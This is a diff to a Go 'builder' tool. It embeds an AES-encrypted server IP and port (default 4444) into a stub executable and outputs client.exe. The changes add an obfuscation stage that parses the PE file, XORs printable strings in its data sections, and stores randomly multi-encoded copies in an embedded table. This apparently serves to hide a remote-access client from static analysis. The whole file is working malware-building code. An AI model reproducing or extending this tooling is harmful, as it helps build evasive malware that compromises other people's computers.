@@ -4,12 +4,22 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
+	"debug/pe"
+	"encoding/ascii85"
+	"encoding/base32"
+	"encoding/base64"
+	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/big"
+	"math/rand"
 	"os"
+	"strings"
+	"time"
 )
 
 const (
@@ -29,7 +39,6 @@ func main() {
 	port := flag.Int("port", 4444, "Server Port")
 	flag.Parse()
 
-	// Handle positional arguments for "go run builder.go <ip> <port>"
 	args := flag.Args()
 	if len(args) >= 1 {
 		*ip = args[0]
@@ -42,7 +51,6 @@ func main() {
 
 	stubPath := "stub.exe"
 	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
-		// Try client/client_c.exe if stub.exe doesn't exist
 		stubPath = "client/client_c.exe"
 		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
 			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found. Please compile the client first.")
@@ -54,7 +62,6 @@ func main() {
 		log.Fatalf("[-] Error reading stub: %v", err)
 	}
 
-	// Find all occurrences of the marker
 	var indices []int
 	searchData := data
 	offset := 0
@@ -69,22 +76,26 @@ func main() {
 	}
 
 	if len(indices) == 0 {
-		log.Fatalf("[-] Error: Marker not found in stub binary.")
+		log.Fatalf("[-] Error: Configuration marker (DEADBEEF...) not found in stub binary.")
 	}
 
 	targetIndex := -1
 	if len(indices) == 1 {
 		targetIndex = indices[0]
+		fmt.Printf("[+] Found configuration marker at 0x%X\n", targetIndex)
 	} else {
 		fmt.Printf("[*] Multiple markers found (%d). Searching for the resource placeholder...\n", len(indices))
 		maxZeros := -1
 		for _, idx := range indices {
-			if idx+len(marker)+2032 > len(data) {
+			scanLimit := 2032
+			if idx+len(marker)+scanLimit > len(data) {
+				scanLimit = len(data) - (idx + len(marker))
+			}
+			if scanLimit <= 0 {
 				continue
 			}
-			// Count zeros in the following 2032 bytes
 			zeros := 0
-			for i := 0; i < 2032; i++ {
+			for i := 0; i < scanLimit; i++ {
 				if data[idx+len(marker)+i] == 0 {
 					zeros++
 				}
@@ -96,60 +107,256 @@ func main() {
 		}
 	}
 
+	capacity := 0
+	for i := targetIndex + len(marker); i < len(data); i++ {
+		if data[i] != 0 {
+			break
+		}
+		capacity++
+	}
+	fmt.Printf("[+] Found resource placeholder at 0x%X (Capacity: %d bytes)\n", targetIndex, capacity)
+
 	if targetIndex == -1 {
 		log.Fatalf("[-] Error: Could not identify the correct configuration placeholder.")
 	}
 
-	config := Config{
-		IP:   *ip,
-		Port: *port,
-	}
-
-	configBytes, err := json.Marshal(config)
-	if err != nil {
-		log.Fatalf("[-] Error marshalling config: %v", err)
-	}
-
+	config := Config{IP: *ip, Port: *port}
+	configBytes, _ := json.Marshal(config)
 	encryptedConfig := encrypt(configBytes)
 	if len(encryptedConfig) > 2032 {
-		log.Fatalf("[-] Error: Encrypted config is too large (%d bytes, max 2032).", len(encryptedConfig))
+		log.Fatalf("[-] Error: Encrypted config is too large.")
 	}
 
-	// Pad with zeros to 2032
 	finalPayload := make([]byte, 2032)
 	copy(finalPayload, encryptedConfig)
 
-	// Patch data
 	patchedData := make([]byte, len(data))
 	copy(patchedData, data)
 	copy(patchedData[targetIndex+len(marker):], finalPayload)
+
+	// --- Automated Obfuscation Logic ---
+	rand.Seed(time.Now().UnixNano())
+	xorKey := byte(rand.Intn(254) + 1)
+
+	xorKeyMarker := []byte{0xAA, 0xBB, 0xCC, 0xDD}
+	keyIdx := bytes.Index(patchedData, xorKeyMarker)
+	if keyIdx != -1 {
+		patchedData[keyIdx+4] = xorKey
+		fmt.Printf("[+] Patched XOR key: 0x%02X\n", xorKey)
+	}
+
+	type StringEntry struct {
+		RVA       uint32
+		OrigLen   uint32
+		ResOffset uint32
+		StepCount int32
+		Steps     [16]byte
+	}
+	var stringTable []StringEntry
+	var encodedDataPool []byte
+
+	f, err := pe.Open(stubPath)
+	if err == nil {
+		defer f.Close()
+		var importRVA, importSize uint32
+		if oh64, ok := f.OptionalHeader.(*pe.OptionalHeader64); ok {
+			importRVA = oh64.DataDirectory[1].VirtualAddress
+			importSize = oh64.DataDirectory[1].Size
+		} else if oh32, ok := f.OptionalHeader.(*pe.OptionalHeader32); ok {
+			importRVA = oh32.DataDirectory[1].VirtualAddress
+			importSize = oh32.DataDirectory[1].Size
+		}
+
+		for _, sec := range f.Sections {
+			if strings.Contains(sec.Name, ".rdata") || strings.Contains(sec.Name, ".data") {
+				fmt.Printf("[*] Scanning section %s for strings...\n", sec.Name)
+				start, end := sec.Offset, sec.Offset+sec.Size
+				sectionData := patchedData[start:end]
+				for i := 0; i < len(sectionData); {
+					if isPrintable(sectionData[i]) {
+						j := i
+						for j < len(sectionData) && isPrintable(sectionData[j]) {
+							j++
+						}
+						length := j - i
+						if length >= 4 && j < len(sectionData) && sectionData[j] == 0 {
+							rva := sec.VirtualAddress + uint32(i)
+							if rva >= importRVA && rva < importRVA+importSize {
+								i = j + 1
+								continue
+							}
+							if start+uint32(i) >= uint32(targetIndex) && start+uint32(i) < uint32(targetIndex+len(marker)+capacity) {
+								i = j + 1
+								continue
+							}
+							isMarker := bytes.Contains(sectionData[i:j], marker) || bytes.Contains(sectionData[i:j], xorKeyMarker)
+							if !isMarker {
+								origString := make([]byte, length)
+								copy(origString, sectionData[i:j])
+								encoded, steps := multiStepEncode(origString, xorKey)
+
+								entry := StringEntry{
+									RVA:       rva,
+									OrigLen:   uint32(length),
+									ResOffset: uint32(2032 + 4 + 1000*32 + len(encodedDataPool)), // Estimated
+									StepCount: int32(len(steps)),
+								}
+								copy(entry.Steps[:], steps)
+								stringTable = append(stringTable, entry)
+
+								// XOR original location in EXE to hide plaintext
+								for k := 0; k < length; k++ {
+									patchedData[start+uint32(i)+uint32(k)] ^= xorKey
+								}
+
+								// Store encoded version in pool
+								encLenBuf := make([]byte, 4)
+								binary.LittleEndian.PutUint32(encLenBuf, uint32(len(encoded)))
+								encodedDataPool = append(encodedDataPool, encLenBuf...)
+								encodedDataPool = append(encodedDataPool, encoded...)
+							}
+							i = j + 1
+						} else {
+							i++
+						}
+					} else {
+						i++
+					}
+				}
+			}
+		}
+	}
+
+	// 3. Finalize Resource with String Table and Encoded Data Pool
+	tableStart := targetIndex + len(marker) + 2032
+	numEntries := len(stringTable)
+	if numEntries > 1000 { numEntries = 1000 } // Safety
+
+	binary.LittleEndian.PutUint32(patchedData[tableStart:tableStart+4], uint32(numEntries))
+	poolStartOffset := uint32(2032 + 4 + numEntries*32)
+
+	for i := 0; i < numEntries; i++ {
+		entry := stringTable[i]
+		entry.ResOffset += poolStartOffset - (2032 + 4 + 1000*32) // Fix offset
+		entryOffset := tableStart + 4 + i*32
+		binary.LittleEndian.PutUint32(patchedData[entryOffset:entryOffset+4], entry.RVA)
+		binary.LittleEndian.PutUint32(patchedData[entryOffset+4:entryOffset+8], entry.OrigLen)
+		binary.LittleEndian.PutUint32(patchedData[entryOffset+8:entryOffset+12], entry.ResOffset)
+		binary.LittleEndian.PutUint32(patchedData[entryOffset+12:entryOffset+16], uint32(entry.StepCount))
+		copy(patchedData[entryOffset+16:entryOffset+32], entry.Steps[:])
+	}
+
+	copy(patchedData[tableStart+4+numEntries*32:], encodedDataPool)
+	fmt.Printf("[+] Obfuscated %d strings. Total Table+Pool: %d bytes\n", numEntries, 4 + numEntries*32 + len(encodedDataPool))
 
 	err = ioutil.WriteFile("client.exe", patchedData, 0755)
 	if err != nil {
 		log.Fatalf("[-] Error writing client.exe: %v", err)
 	}
-
 	fmt.Println("[+] Successfully built client.exe")
 }
 
+func isPrintable(b byte) bool {
+	return b >= 32 && b <= 126
+}
+
+const (
+	StepXOR = 0
+	StepB64 = 1
+	StepB32 = 2
+	StepB16 = 3
+	StepB58 = 4
+	StepB62 = 5
+	StepB85 = 6
+	StepB91 = 7
+)
+
+func multiStepEncode(data []byte, xorKey byte) ([]byte, []byte) {
+	steps := []byte{StepXOR}
+	current := make([]byte, len(data))
+	copy(current, data)
+	for i := range current { current[i] ^= xorKey }
+
+	numBases := rand.Intn(3) + 1
+	for i := 0; i < numBases; i++ {
+		baseType := byte(rand.Intn(7) + 1)
+		var next []byte
+		switch baseType {
+		case StepB64: next = []byte(base64.StdEncoding.EncodeToString(current))
+		case StepB32: next = []byte(base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(current))
+		case StepB16: next = []byte(strings.ToUpper(hex.EncodeToString(current)))
+		case StepB58: next = []byte(base58Encode(current))
+		case StepB62: next = []byte(base62Encode(current))
+		case StepB85:
+			buf := make([]byte, ascii85.MaxEncodedLen(len(current)))
+			n := ascii85.Encode(buf, current)
+			next = buf[:n]
+		case StepB91: next = []byte(base91Encode(current))
+		}
+		if len(next) > 0 && len(next) <= 8192 {
+			current = next
+			steps = append(steps, baseType)
+		}
+	}
+	for i := range current { current[i] ^= xorKey }
+	steps = append(steps, StepXOR)
+	return current, steps
+}
+
+func base58Encode(input []byte) string {
+	return baseNEncode(input, "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz", 58)
+}
+
+func base62Encode(input []byte) string {
+	return baseNEncode(input, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", 62)
+}
+
+func baseNEncode(input []byte, alphabet string, base int) string {
+	if len(input) == 0 { return "" }
+	n := new(big.Int).SetBytes(input)
+	b := big.NewInt(int64(base))
+	var res []byte
+	for n.Cmp(big.NewInt(0)) > 0 {
+		var m big.Int
+		n.QuoRem(n, b, &m)
+		res = append(res, alphabet[m.Int64()])
+	}
+	for _, v := range input {
+		if v != 0 { break }
+		res = append(res, alphabet[0])
+	}
+	for i, j := 0, len(res)-1; i < j; i, j = i+1, j-1 { res[i], res[j] = res[j], res[i] }
+	return string(res)
+}
+
+func base91Encode(input []byte) string {
+	alphabet := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\""
+	var res []byte
+	var b, n uint32
+	for _, v := range input {
+		b |= uint32(v) << n
+		n += 8
+		if n >= 13 {
+			v := b & 8191
+			if v > 88 { b >>= 13; n -= 13 } else { v = b & 16383; b >>= 14; n -= 14 }
+			res = append(res, alphabet[v%91], alphabet[v/91])
+		}
+	}
+	if n > 0 {
+		res = append(res, alphabet[b%91])
+		if n > 7 || b > 90 { res = append(res, alphabet[b/91]) }
+	}
+	return string(res)
+}
+
 func encrypt(plaintext []byte) []byte {
-	block, err := aes.NewCipher([]byte(ConfigKey))
-	if err != nil {
-		log.Fatalf("[-] AES error: %v", err)
-	}
-
-	// No padding requested by client (using fixed size buffer)
-	// But we need to handle block size for CBC
+	block, _ := aes.NewCipher([]byte(ConfigKey))
 	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
-	if padding == 0 {
-		padding = aes.BlockSize
-	}
-	padtext := bytes.Repeat([]byte{0}, padding) // Zero padding for simplicity in C
+	if padding == 0 { padding = aes.BlockSize }
+	padtext := bytes.Repeat([]byte{0}, padding)
 	plaintext = append(plaintext, padtext...)
-
 	ciphertext := make([]byte, len(plaintext))
 	mode := cipher.NewCBCEncrypter(block, []byte(ConfigIV))
 	mode.CryptBlocks(ciphertext, plaintext)
-
 	return ciphertext
 }
